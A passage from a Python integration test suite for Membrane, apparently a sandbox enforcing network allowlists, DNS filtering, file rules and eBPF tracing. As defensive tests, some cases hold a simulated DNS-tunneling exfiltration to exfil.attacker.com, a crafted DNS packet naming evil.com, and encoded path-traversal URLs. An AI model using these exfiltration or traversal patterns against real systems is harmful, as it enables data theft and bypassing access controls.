#!/usr/bin/env python3
"""Integration tests against real Docker/Sysbox. Use --list to find a group."""

import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import ExitStack
from dataclasses import dataclass, field
import gzip
import json
import os
from pathlib import Path
import pty
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import termios
import time
import traceback
from typing import Callable

REPO_ROOT = Path(__file__).resolve().parent.parent


class TestFailure(Exception):
    pass


@dataclass
class Context:
    number: int
    membrane_cmd: str
    workdir: Path
    environment: dict
    output: list = field(default_factory=list)
    invocation: int = 0
    last_command: str = ""


def check(ctx, condition, description):
    if not condition:
        raise TestFailure(description + "\n" + ctx.last_command)
    ctx.output.append("PASS " + description)


def command_details(args, expected, actual, stdout, stderr):
    return (f"$ {shlex.join(map(str, args))}\n"
            f"expected exit: {expected}; actual exit: {actual}\n"
            f"stdout:\n{stdout}\nstderr:\n{stderr}")


def run(ctx, args, *, cwd=None, env=None, input=None, timeout=120, expected=0):
    """Capture every command; expected=None leaves status checks to the caller."""
    cwd = cwd if cwd is not None else ctx.workdir
    env = env if env is not None else (ctx.environment if ctx else None)
    actual, stdout, stderr = "not started", "", ""
    problem = None
    try:
        with subprocess.Popen(args, cwd=cwd, env=env, text=True,
                              stdin=subprocess.PIPE if input is not None else subprocess.DEVNULL,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              start_new_session=True) as process:
            try:
                stdout, stderr = process.communicate(input, timeout=timeout)
            except subprocess.TimeoutExpired:
                # Give Membrane and its children time to clean up on SIGTERM.
                try:
                    os.killpg(process.pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
                try:
                    stdout, stderr = process.communicate(timeout=20)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(process.pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                    stdout, stderr = process.communicate()
                problem = f"timed out after {timeout}s"
            actual = process.returncode
    except OSError as error:
        problem = str(error)
    details = command_details(args, expected if expected is not None else "any", actual, stdout, stderr)
    if ctx:
        ctx.last_command = details
        with (ctx.workdir / "commands.log").open("a") as log:
            log.write(f"cwd: {cwd}\n{details}\n\n")
    if problem or (expected is not None and actual != expected):
        label = f"group {ctx.number:02}" if ctx else "warmup"
        raise TestFailure(f"{label}: {problem or 'unexpected exit status'}\n{details}")
    return subprocess.CompletedProcess(args, actual, stdout, stderr)


def membrane(ctx, command, *, options=(), **kwargs):
    """Run an ordinary non-tracing workload and retain its session ID for logs."""
    ctx.invocation += 1
    return run(ctx, [ctx.membrane_cmd, "--no-update", "--no-trace", "--no-global-config",
                     f"--session-id-file={ctx.workdir / f'session-id-{ctx.invocation}'}",
                     *options, "--", *command], **kwargs)


def config(ctx, contents):
    (ctx.workdir / ".membrane.yaml").write_text(contents)


def http(ctx, description, expected, url, *, method="GET", options=(), curl_options=()):
    command = ["curl", "-svL", "-m", "5"]
    if method != "GET":
        command += ["-X", method]
    # As in the old tests, examine the first verbose HTTP response, even if
    # curl later fails while following a redirect. "HTTP" means any response.
    result = membrane(ctx, [*command, *curl_options, url], options=options, expected=None)
    response = next((line.strip() for line in (result.stdout + result.stderr).splitlines()
                     if "< HTTP" in line), "")
    check(ctx, expected in response, f"{description} (expected {expected}, got {response!r})")


def exit_status(ctx, description, expected, command, *, options=()):
    membrane(ctx, command, options=options, expected=expected)
    check(ctx, True, f"{description} (exit {expected})")


def dns(ctx, description, expected, command):
    result = membrane(ctx, command)
    match = re.search(r"status: ([A-Z]+)", result.stdout)
    status = match.group(1) if match else "no DNS status"
    check(ctx, status == expected, f"{description} (expected {expected}, got {status})")


def group_1(ctx):
    config(ctx, """allow:
  - httpbin.org
""")
    http(ctx, '1A plain hostname GET / passthrough', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '1B plain hostname POST / passthrough (origin decides)', 'HTTP',
         'https://httpbin.org/anything/root', method='POST')


def group_2(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
""")
    http(ctx, '2A bare URL entry GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '2B bare URL entry GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '2C bare URL entry POST /anything/posts/ allowed (no method constraint)', 'HTTP',
         'https://httpbin.org/anything/posts/', method='POST')


def group_3(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
""")
    http(ctx, '3A method constraint GET / allowed', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '3B method constraint POST / blocked', '403',
         'https://httpbin.org/anything/root', method='POST')


def group_4(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
""")
    http(ctx, '4A method+url_path GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '4B method+url_path GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '4C method+url_path POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')
    http(ctx, '4D method+url_path GET / blocked (outside url_path)', '403',
         'https://httpbin.org/')


def group_5(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '5A absolute path GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '5B absolute path GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '5C absolute path POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_6(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
        paths:
          - on-the-money/
""")
    http(ctx, '6A relative path GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '6B relative path GET / blocked (outside dest path)', '403',
         'https://httpbin.org/')


def group_7(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
      - methods: [GET]
        paths:
          - /anything/about
""")
    http(ctx, '7A multiple rules GET /anything/posts/ allowed (rule 1)', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '7B multiple rules GET /anything/about allowed (rule 2)', '200',
         'https://httpbin.org/anything/about')
    http(ctx, '7C multiple rules GET / blocked (no rule matches)', '403',
         'https://httpbin.org/')
    http(ctx, '7D multiple rules POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_8(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
  - dest: https://httpbin.org/anything/about
""")
    http(ctx, '8A multiple entries GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '8B multiple entries GET /anything/about allowed', '200',
         'https://httpbin.org/anything/about')
    http(ctx, '8C multiple entries GET / blocked', '403',
         'https://httpbin.org/')


def group_9(ctx):
    config(ctx, "")
    exit_status(ctx, '9A host not in allow list fails', 6,
                ['curl', '-sf', '-m', '5', 'https://example.com'])


def group_10(ctx):
    http(ctx, '10A CLI bare URL GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/', options=['--allow=https://httpbin.org/anything/posts/'])
    http(ctx, '10B CLI bare URL GET / blocked', '403',
         'https://httpbin.org/', options=['--allow=https://httpbin.org/anything/posts/'])
    http(ctx, '10C CLI plain hostname GET / passthrough', '200',
         'https://httpbin.org/anything/root', options=['--allow=httpbin.org'])


def group_11(ctx):
    config(ctx, """allow:
  - github.com
""")
    dns(ctx, '11A DNS allowed domain resolves', 'NOERROR', ['dig', 'github.com'])
    dns(ctx, '11B DNS blocked domain gets NXDOMAIN', 'NXDOMAIN', ['dig', 'google.com'])
    # c2VjcmV0Cg== is base64("secret\n"), the old tunneling payload.
    dns(ctx, '11C DNS tunneling attempt gets NXDOMAIN', 'NXDOMAIN', ['dig', 'c2VjcmV0Cg==.exfil.attacker.com'])
    exit_status(ctx, '11D DNS direct resolver bypass blocked', 9,
                ['dig', '@8.8.8.8', 'github.com'], options=['--allow=github.com'])


def group_12(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '12A path boundary GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '12B path boundary GET /anything/posts/on-the-money/ allowed (subpath)', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '12C path boundary GET /anything/posts-evil blocked (no boundary)', '403',
         'https://httpbin.org/anything/posts-evil')


def group_13(ctx):
    config(ctx, """allow:
  - dest: httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '13A host-type http rules GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '13B host-type http rules GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '13C host-type http rules POST /anything/posts/ blocked', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_14(ctx):
    (ctx.workdir / "secrets").mkdir()
    (ctx.workdir / "secrets/api-key.txt").write_text("api-key-value\n")
    config(ctx, "ignore:\n  - secrets/\n")
    exit_status(ctx, "14A trailing-slash ignore hides directory contents", 1,
                ["cat", "/workspace/secrets/api-key.txt"])


def group_15(ctx):
    ip = socket.gethostbyname('httpbin.org')
    config(ctx, f"""allow:
  - dest: {ip}
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '15A CIDR http rules GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/', curl_options=['--resolve', f'httpbin.org:443:{ip}'])
    http(ctx, '15B CIDR http rules GET / blocked', '403',
         'https://httpbin.org/', curl_options=['--resolve', f'httpbin.org:443:{ip}'])
    http(ctx, '15C CIDR http rules POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST', curl_options=['--resolve', f'httpbin.org:443:{ip}'])


def group_16(ctx):
    config(ctx, "allow:\n  - github.com\n")
    result = membrane(ctx, ["python3", "-c", r'''
import socket, struct, subprocess
routes = subprocess.check_output(["ip", "route"]).decode()
gateway = next(line.split()[2] for line in routes.splitlines() if "default" in line)
names = ["github.com", "evil.com"]
packet = struct.pack("!HHHHHH", 0x1234, 0x0100, len(names), 0, 0, 0)
for name in names:
    for part in name.split("."):
        packet += bytes([len(part)]) + part.encode()
    packet += b"\x00" + struct.pack("!HH", 1, 1)
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.settimeout(3)
    sock.sendto(packet, (gateway, 53))
    response, _ = sock.recvfrom(512)
print("RCODE", response[3] & 0x0F)
'''])
    check(ctx, "RCODE 3" in result.stdout,
          "16A multi-question DNS packet blocked (NXDOMAIN)")


def group_17(ctx):
    config(ctx, """allow:
  - 8.8.8.8
""")
    exit_status(ctx, '17A UDP blocked by default to allowed IP', 9,
                ['dig', '@8.8.8.8', 'github.com'])
    http(ctx, '17B TCP still works to allowed IP', 'HTTP',
         'https://8.8.8.8/')
    config(ctx, """allow:
  - dest: 8.8.8.8
    ports: [53/udp]
""")
    exit_status(ctx, '17C UDP opt-in allows DNS', 0,
                ['dig', '@8.8.8.8', 'github.com'])


def group_18(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '18A dot-segment traversal blocked', '403',
         'https://httpbin.org/anything/posts/../', curl_options=['--path-as-is'])
    http(ctx, '18B double dot-segment blocked', '403',
         'https://httpbin.org/anything/posts/on-the-money/../../', curl_options=['--path-as-is'])
    http(ctx, '18C percent-encoded traversal outside allowed path blocked', '403',
         'https://httpbin.org/anything/posts/%2e%2e/', curl_options=['--path-as-is'])
    http(ctx, '18D double-encoded traversal outside allowed path blocked', '403',
         'https://httpbin.org/anything/posts/%252e%252e/', curl_options=['--path-as-is'])
    http(ctx, '18E normal path still allowed', '200',
         'https://httpbin.org/anything/posts/')


def group_19(ctx):
    config(ctx, """allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
""")
    exit_status(ctx, '19A raw TCP blocked to host with http-only rules', 1,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    config(ctx, """allow:
  - github.com
""")
    exit_status(ctx, '19B raw TCP allowed to plain hostname', 0,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    config(ctx, """allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
  - dest: github.com
    ports: [22/tcp]
""")
    exit_status(ctx, '19C raw TCP allowed on explicitly permitted port alongside http rules', 0,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])


def group_20(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
        paths:
          - on-the-money/
""")
    http(ctx, '20A URL+http GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '20B URL+http GET /anything/posts/ blocked (outside path constraint)', '403',
         'https://httpbin.org/anything/posts/')
    http(ctx, '20C URL+http POST /anything/posts/on-the-money/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/on-the-money/', method='POST')
    http(ctx, '20D URL+http GET / blocked (outside url prefix)', '403',
         'https://httpbin.org/')


def group_21(ctx):
    ip = socket.gethostbyname('github.com')
    config(ctx, f"""allow:
  - dest: {ip}
    http:
      - methods: [GET]
        paths:
          - /
""")
    exit_status(ctx, '21A CIDR http-only rules block raw TCP', 1,
                ["bash", "-c", f'sleep 3 | ncat -w3 {ip} 22 2>&1 | grep -q SSH'])
    http(ctx, '21B CIDR http rules still allow HTTP', '200',
         'https://github.com/', curl_options=['--resolve', f'github.com:443:{ip}'])


def group_22(ctx):
    config(ctx, """allow:
  - dest: portquiz.takao-tech.com
    http:
      - methods: [GET]
        paths:
          - /allowed/
""")
    http(ctx, '22A http rules enforced on non-standard port 8443', '403',
         'https://portquiz.takao-tech.com:8443/')
    http(ctx, '22B http rules allow correct path on non-standard port 8443', 'HTTP',
         'https://portquiz.takao-tech.com:8443/allowed/')


def group_23(ctx):
    config(ctx, """allow:
  - "*.httpbin.org"
""")
    exit_status(ctx, '23A host pattern *.httpbin.org blocks apex httpbin.org', 6,
                ['curl', '-sf', '-m', '5', 'https://httpbin.org/'])
    config(ctx, """allow:
  - "*.github.com"
""")
    http(ctx, '23B host pattern *.github.com allows api.github.com', '200',
         'https://api.github.com/')
    exit_status(ctx, '23C host pattern *.github.com blocks apex github.com', 6,
                ['curl', '-sf', '-m', '5', 'https://github.com/'])


def group_24(ctx):
    config(ctx, """allow:
  - "*"
""")
    http(ctx, '24A bare * allows arbitrary host', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '24B bare * allows another arbitrary host', '200',
         'https://api.github.com/')
    config(ctx, """allow:
  - dest: "*"
    ports: [443/tcp]
""")
    exit_status(ctx, '24C bare * with ports:[443/tcp] blocks SSH port 22', 1,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    http(ctx, '24D bare * with ports:[443/tcp] allows HTTPS', '200',
         'https://httpbin.org/anything/root')

class Session:
    """A live workload with file readiness gates, optional terminal, and cleanup.

    Prepare directory first, then use with Session(...) (or ExitStack) so every
    started process is stopped even when a host-side assertion fails.
    """

    def __init__(self, ctx, directory, command, *, options=(), env=None, terminal=False):
        self.ctx, self.directory = ctx, directory
        self.idfile = directory / "session-id"
        self.args = [ctx.membrane_cmd, "--no-update", "--no-global-config",
                     f"--session-id-file={self.idfile}", *options, "--", *command]
        self.env = env if env is not None else ctx.environment
        self.use_terminal = terminal
        self.terminal = None
        self.terminal_state = None
        self.process = None
        self.log = None

    def __enter__(self):
        try:
            self.log = (self.directory / "output.log").open("w")
            if self.use_terminal:
                self.terminal = pty.openpty()
                self.terminal_state = termios.tcgetattr(self.terminal[1])
            self.process = subprocess.Popen(
                self.args, cwd=self.directory, env=self.env,
                stdin=self.terminal[1] if self.terminal else subprocess.DEVNULL,
                stdout=self.log, stderr=self.log, start_new_session=True)
        except OSError as error:
            self.close()
            raise TestFailure(f"group {self.ctx.number}: {error}\n" + command_details(
                self.args, "started", "not started", "", "")) from error
        return self

    def __exit__(self, *_):
        self.close()

    @property
    def id(self):
        return self.idfile.read_text().strip()

    def output(self):
        return (self.directory / "output.log").read_text()

    def details(self, expected):
        return command_details(self.args, expected, self.process.poll(),
                               self.output(), "(merged into stdout)")

    def wait_for(self, marker, timeout=90):
        deadline = time.monotonic() + timeout
        while not (self.directory / marker).exists():
            if self.process.poll() is not None or time.monotonic() > deadline:
                raise TestFailure(f"group {self.ctx.number}: session did not reach {marker}\n"
                                  + self.details("running until ready"))
            time.sleep(0.1)

    def release(self, marker="continue"):
        (self.directory / marker).touch()

    def wait(self, expected=0, timeout=90):
        try:
            code = self.process.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            raise TestFailure(f"group {self.ctx.number}: session timed out after {timeout}s\n"
                              + self.details(expected)) from None
        details = self.details(expected)
        self.ctx.last_command = details
        with (self.ctx.workdir / "commands.log").open("a") as log:
            log.write(details + "\n\n")
        if expected is not None and code != expected:
            raise TestFailure(f"group {self.ctx.number}: unexpected session exit\n" + details)
        if expected is not None:
            check(self.ctx, True, f"{self.directory.name}: exit {code}")
        return self.output()

    def close(self):
        try:
            if self.process is not None:
                try:
                    os.killpg(self.process.pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
                try:
                    self.process.wait(timeout=20)
                except subprocess.TimeoutExpired:
                    pass
                # Membrane gets the first chance to clean up; reap leftover CLI
                # children even if the leader has already exited.
                try:
                    os.killpg(self.process.pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
                self.process.wait()
        finally:
            if self.log is not None:
                self.log.close()
            if self.terminal:
                try:
                    if self.terminal_state is not None:
                        termios.tcsetattr(self.terminal[1], termios.TCSANOW, self.terminal_state)
                finally:
                    for fd in self.terminal:
                        os.close(fd)
                    self.terminal = None


def trace_events(ctx, path):
    # Reading to EOF verifies the gzip CRC/trailer and every JSONL record.
    with gzip.open(path, "rt") as stream:
        events = [json.loads(line) for line in stream]
    check(ctx, bool(events), "valid nonempty gzip JSONL: " + str(path))
    return events


def check_events(ctx, events, token, port, output, executable="/workspace/trace-workload"):
    check(ctx, any(e.get("type") == "process_exec" and e.get("argv", "").startswith(executable + " " + token + " ")
              for e in events), token + ": first exec")
    check(ctx, any(e.get("type") == "file_open" and e.get("path") == "/tmp/" + token + ".write"
              and e["flags"] & 3 in (1, 2)
              for e in events), token + ": immediate write-open")
    check(ctx, any(e.get("type") == "socket_connect" and e.get("daddr") == "198.51.100.7" and e.get("dport") == port
              for e in events), token + ": IPv4 connect")
    check(ctx, any(e.get("type") == "socket_connect" and e.get("family") == 2
              and e.get("daddr") == "127.0.0.1" and e.get("dport") == port + 10
              for e in events), token + ": IPv4 loopback connect")
    if "IPV6 " + token + " true" in output:
        check(ctx, any(e.get("type") == "socket_connect" and e.get("daddr") == "2001:db8::7" and e.get("dport") == port
                  for e in events), token + ": IPv6 connect")
        check(ctx, all(any(e.get("type") == "socket_connect" and e.get("family") == 10
                      and e.get("daddr") == addr and e.get("dport") == port + 10
                      for e in events) for addr in ("::1", "127.0.0.1")),
              token + ": IPv6 loopback and mapped-loopback connects")
    else:
        check(ctx, "IPV6 " + token + " false" in output, token + ": IPv6 availability reported")
        ctx.output.append("SKIP " + token + ": kernel cannot create IPv6 sockets")


def inspect(ctx, name):
    return json.loads(run(ctx, ["docker", "inspect", name]).stdout)[0]


def check_handler(ctx, session, traced=True):
    data = inspect(ctx, "membrane-handler-" + session.id)
    cfg = data["HostConfig"]
    caps = {c.removeprefix("CAP_") for c in cfg.get("CapAdd") or []}
    expected = {"NET_ADMIN", "BPF", "PERFMON"} if traced else {"NET_ADMIN"}
    check(ctx, caps == expected and not cfg["Privileged"] and cfg["PidMode"] != "host", "handler capabilities and namespaces")
    mounts = {m["Destination"]: m for m in data["Mounts"]}
    kernel = {"/sys/fs/cgroup", "/sys/kernel/tracing"}
    check(ctx, kernel.intersection(mounts) == (kernel if traced else set())
          and all(not mounts[p]["RW"] for p in kernel.intersection(mounts))
          and ("/trace" in mounts) == traced, "tracing mounts match --no-trace setting")
    return data


def cleaned(ctx, session):
    host_prefix = ["colima", "ssh", "--profile", "membrane", "--"] if sys.platform == "darwin" else []
    resources = (("container", "agent"), ("container", "handler"), ("network", "internal"),
                 ("network", "external"), ("volume", "ca"))
    check(ctx, all(run(ctx, ["docker", kind, "inspect", "membrane-" + name + "-" + session.id], expected=None).returncode != 0
              for kind, name in resources), session.directory.name + ": session Docker resources removed")
    check(ctx, all(run(ctx, [*host_prefix, "test", "!", "-d", path], expected=None).returncode == 0 for path in
              ("/sys/fs/cgroup/membrane-" + session.id, "/sys/fs/cgroup/membrane" + session.id + ".slice")),
          session.directory.name + ": session parent removed")


def build_trace_workload(ctx):
    info = json.loads(run(ctx, ["docker", "info", "--format", "{{json .}}"]).stdout)
    check(ctx, "sysbox-runc" in info["Runtimes"], "Sysbox runtime available")
    ctx.output.append("ENV kernel=" + info["KernelVersion"] + " driver=" + info["CgroupDriver"] + " cgroup=" + info["CgroupVersion"])
    arch = {"aarch64": "arm64", "x86_64": "amd64"}.get(info["Architecture"], info["Architecture"])
    run(ctx, ["go", "build", "-buildvcs=false", "-o", str(ctx.workdir / "trace-workload"),
              str(REPO_ROOT / "scripts/testdata/trace-workload.go")],
        env=dict(ctx.environment, CGO_ENABLED="0", GOOS="linux", GOARCH=arch))


def trace_docker_env(ctx):
    # Pass through to real Docker. Hold one start to inspect pre-workload state;
    # separately remove tracing capabilities to exercise a real loader failure.
    wrapper = ctx.workdir / "bin"
    wrapper.mkdir()
    shim = wrapper / "docker"
    shim.write_text(f'''#!{sys.executable}
import os, sys, time
from pathlib import Path
args = sys.argv[1:]
if args[0] == "run" and "membrane-handler" in args and os.getenv("FAIL_BPF"):
    args = [a for a in args if a not in ("--cap-add=BPF", "--cap-add=PERFMON")]
if args[0] == "start" and os.getenv("CHECK_START"):
    gate = Path(os.environ["CHECK_START"])
    (gate / "before-start").touch()
    deadline = time.monotonic() + 90
    while not (gate / "start").exists():
        if time.monotonic() >= deadline:
            sys.exit("test start gate timed out")
        time.sleep(0.05)
os.execv({shutil.which("docker")!r}, ["docker"] + args)
''')
    shim.chmod(0o755)
    return dict(ctx.environment, PATH=str(wrapper) + os.pathsep + ctx.environment["PATH"])


def trace_session(ctx, token, port, *, traced=True, dind=False, env=None, terminal=False):
    directory = ctx.workdir / token
    directory.mkdir()
    shutil.copy2(ctx.workdir / "trace-workload", directory / "trace-workload")
    options = ["--trace-log=" + str(directory / "trace.jsonl.gz")]
    if not traced:
        options.append("--no-trace")
    command = ["/workspace/trace-workload", token, str(port), "tty" if terminal else "hold"]
    if dind:
        command.append("dind")
    return Session(ctx, directory, command, options=options, env=env, terminal=terminal)


def group_25(ctx):
    base = ctx.workdir
    host_prefix = ["colima", "ssh", "--profile", "membrane", "--"] if sys.platform == "darwin" else []
    build_trace_workload(ctx)
    env = trace_docker_env(ctx)
    with ExitStack() as sessions:
        a = sessions.enter_context(trace_session(
            ctx, "trace-a", 45101, dind=True, env=dict(env, CHECK_START=str(base / "trace-a"))))
        a.wait_for("before-start")
        agent, handler = inspect(ctx, "membrane-agent-" + a.id), check_handler(ctx, a)
        parent = agent["HostConfig"]["CgroupParent"]
        cgroup = "/sys/fs/cgroup/" + parent.lstrip("/")
        check(ctx, agent["State"]["Status"] == "created" and agent["State"]["Pid"] == 0
              and bool(parent) and handler["HostConfig"]["CgroupParent"] != parent
              and run(ctx, [*host_prefix, "test", "-d", cgroup], expected=None).returncode == 0, "session parent exists before workload, outside handler")
        check(ctx, "MEMBRANE_TARGET_CGROUP=" + cgroup in handler["Config"]["Env"]
              and run(ctx, ["docker", "exec", "membrane-handler-" + a.id, "test", "-f", "/tmp/tracer-ready"], expected=None).returncode == 0,
              "BPF scoped and ready before docker start")
        a.release("start")
        a.wait_for("trace-a.first")
        pid = inspect(ctx, "membrane-agent-" + a.id)["State"]["Pid"]
        check(ctx, run(ctx, [*host_prefix, "cat", f"/proc/{pid}/cgroup"]).stdout.strip().startswith("0::/" + parent.lstrip("/") + "/"),
              "workload runs beneath pre-created parent")
        b = sessions.enter_context(trace_session(ctx, "trace-b", 45102))
        b.wait_for("trace-b.first")
        run(ctx, ["docker", "run", "--rm", "--network=none", "-v", str(base / "trace-workload") + ":/probe:ro",
               "--entrypoint=/probe", "membrane-agent", "trace-other", "45301"])
        a.release()
        output_a = a.wait()  # Keep B active through A's inner Docker workload.
        b.release()
        output_b = b.wait()
        events_a, events_b = trace_events(ctx, a.directory / "trace.jsonl.gz"), trace_events(ctx, b.directory / "trace.jsonl.gz")
        check_events(ctx, events_a, "trace-a", 45101, output_a)
        check_events(ctx, events_b, "trace-b", 45102, output_b)
        check(ctx, any(e.get("type") == "file_open" and e.get("path") == "/etc/hostname"
                  and e["flags"] & 3 == 0 for e in events_a), "read-only file opens recorded")
        check(ctx, "trace-b" not in json.dumps(events_a) and "trace-a" not in json.dumps(events_b)
              and "trace-other" not in json.dumps(events_a + events_b), "concurrent sessions and unrelated container isolated")
        check(ctx, "DIND trace-a ok" in output_a, "inner Docker workload completed")
        check_events(ctx, events_a, "inner-trace-a", 45201, output_a, executable="/probe")
        cleaned(ctx, a)
        cleaned(ctx, b)


def group_26(ctx):
    (ctx.workdir / "secrets").mkdir()
    (ctx.workdir / "secrets/api-key.txt").write_text("api-key-value\n")
    config(ctx, "readonly:\n  - secrets/\n")
    exit_status(ctx, "26A trailing-slash readonly makes directory read-only", 1,
                ["bash", "-c", "echo test > /workspace/secrets/api-key.txt"])


def group_27(ctx):
    (ctx.workdir / "config").mkdir()
    (ctx.workdir / "config/settings.yaml").write_text("safe-setting\n")
    (ctx.workdir / "config/secrets.txt").write_text("secret-value\n")
    config(ctx, "readonly:\n  - config/\nignore:\n  - config/secrets.txt\n")
    exit_status(ctx, "27A ignore nested inside readonly errors at startup", 1,
                ["echo", "should not run"])


def group_28(ctx):
    build_trace_workload(ctx)
    with trace_session(ctx, "trace-disabled", 45103, traced=False) as n:
        n.wait_for("trace-disabled.first")
        check_handler(ctx, n, traced=False)
        n.release()
        n.wait()
        check(ctx, not (n.directory / "trace.jsonl.gz").exists(), "--no-trace produces no trace file")
        cleaned(ctx, n)

    env = trace_docker_env(ctx)
    with trace_session(ctx, "trace-failed", 45105, env=dict(env, FAIL_BPF="1")) as failed:
        failed_output = failed.wait(expected=None, timeout=60)
        check(ctx, failed.process.returncode != 0 and "load eBPF objects" in failed_output,
              "BPF load failure aborts setup clearly")
        check(ctx, not (failed.directory / "trace-failed.first").exists(), "failed loading never starts workload")
        cleaned(ctx, failed)


def group_29(ctx):
    build_trace_workload(ctx)
    run(ctx, [ctx.membrane_cmd, "--no-update", "--no-global-config",
              "--trace-log=" + str(ctx.workdir / "exit37.gz"), "--", "bash", "-c", "exit 37"],
        timeout=60, expected=37)
    check(ctx, True, "workload exit 37 preserved")

    with trace_session(ctx, "trace-terminal", 45104, terminal=True) as terminal:
        terminal.wait_for("trace-terminal.first")
        master, slave = terminal.terminal
        os.write(master, b"membrane-terminal-input\n")
        deadline = time.monotonic() + 10
        while "TTY INPUT membrane-terminal-input" not in terminal.output() and time.monotonic() < deadline:
            time.sleep(0.1)
        check(ctx, "TTY INPUT membrane-terminal-input" in terminal.output(), "terminal input reaches workload")
        os.write(master, b"\x03")
        terminal.wait(expected=130)
        check(ctx, termios.tcgetattr(slave) == terminal.terminal_state, "terminal settings restored after Ctrl-C")
        trace_events(ctx, terminal.directory / "trace.jsonl.gz")
        cleaned(ctx, terminal)


@dataclass(frozen=True)
class TestGroup:
    description: str
    run: Callable[[Context], None]


GROUPS = {
    1: TestGroup("hostname HTTP passthrough", group_1),
    2: TestGroup("URL allowlist prefixes", group_2),
    3: TestGroup("HTTP method restrictions", group_3),
    4: TestGroup("HTTP methods with URL prefixes", group_4),
    5: TestGroup("absolute HTTP path rules", group_5),
    6: TestGroup("relative HTTP path rules", group_6),
    7: TestGroup("multiple HTTP rules per destination", group_7),
    8: TestGroup("multiple allowlist destinations", group_8),
    9: TestGroup("default-deny host policy", group_9),
    10: TestGroup("CLI hostname and URL allowlists", group_10),
    11: TestGroup("DNS filtering and resolver bypass", group_11),
    12: TestGroup("HTTP path boundaries", group_12),
    13: TestGroup("HTTP rules on hostname destinations", group_13),
    14: TestGroup("ignored filesystem paths", group_14),
    15: TestGroup("HTTP rules on IP destinations", group_15),
    16: TestGroup("multi-question DNS rejection", group_16),
    17: TestGroup("UDP default deny and port opt-in", group_17),
    18: TestGroup("HTTP path traversal rejection", group_18),
    19: TestGroup("raw TCP with HTTP-only host rules", group_19),
    20: TestGroup("combined URL and HTTP path constraints", group_20),
    21: TestGroup("raw TCP with HTTP-only IP rules", group_21),
    22: TestGroup("HTTPS rules on nonstandard ports", group_22),
    23: TestGroup("wildcard subdomains and apex exclusion", group_23),
    24: TestGroup("all-host wildcard and port restrictions", group_24),
    25: TestGroup("eBPF tracing and session isolation", group_25),
    26: TestGroup("readonly filesystem paths", group_26),
    27: TestGroup("conflicting filesystem policy rules", group_27),
    28: TestGroup("tracing modes and failure handling", group_28),
    29: TestGroup("traced workload lifecycle and terminal I/O", group_29),
}


def run_group(number, membrane_cmd, environment, artifacts, keep_artifacts):
    output = [f"=== {number:02}: {GROUPS[number].description} ==="]
    directory = None
    passed = False
    try:
